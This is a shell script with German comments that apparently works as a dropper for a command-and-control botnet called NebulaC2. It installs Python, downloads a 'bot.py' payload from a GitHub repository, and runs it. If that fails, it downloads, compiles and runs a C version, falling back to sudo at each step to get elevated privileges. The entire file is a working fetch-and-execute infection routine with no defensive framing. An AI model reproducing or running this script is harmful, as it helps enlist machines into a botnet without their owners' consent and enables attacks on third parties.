#!/bin/sh

# --- Python/Pip Installation (ohne und mit sudo) ---
apt update
apt install -y python3 python3-pip
apt install -y python python-pip
yum install -y python3 python3-pip
yum install -y python python-pip
pkg install -y python3 python3-pip
pkg install -y python python-pip

sudo apt update
sudo apt install -y python3 python3-pip
sudo apt install -y python python-pip
sudo yum install -y python3 python3-pip
sudo yum install -y python python-pip
sudo pkg install -y python3 python3-pip
sudo pkg install -y python python-pip

# --- Python-Skript herunterladen ---
wget -O bot.py https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.py
curl -o bot.py https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.py

# --- Python-Pakete installieren ---
pip3 install --user cloudscraper requests
pip install --user cloudscraper requests

sudo pip3 install cloudscraper requests
sudo pip install cloudscraper requests

# --- Python-Skript ausführen ---
python3 bot.py
if [ $? -ne 0 ]; then
  python bot.py
  if [ $? -ne 0 ]; then
    sudo python3 bot.py
    if [ $? -ne 0 ]; then
      sudo python bot.py
      if [ $? -ne 0 ]; then
        echo "Python funktioniert nicht, versuche C-Programm..."
        # --- C-Programm herunterladen ---
        wget -O bot.c https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.c
        curl -o bot.c https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.c

        # --- Kompilieren ohne und mit sudo ---
        gcc -o bot bot.c
        if [ $? -ne 0 ]; then
          sudo gcc -o bot bot.c
        fi

        # --- Ausführbar machen ---
        chmod +x bot
        sudo chmod +x bot

        # --- Ausführen ohne und mit sudo ---
        ./bot
        if [ $? -ne 0 ]; then
          sudo ./bot
        fi
      fi
    fi
  fi
fi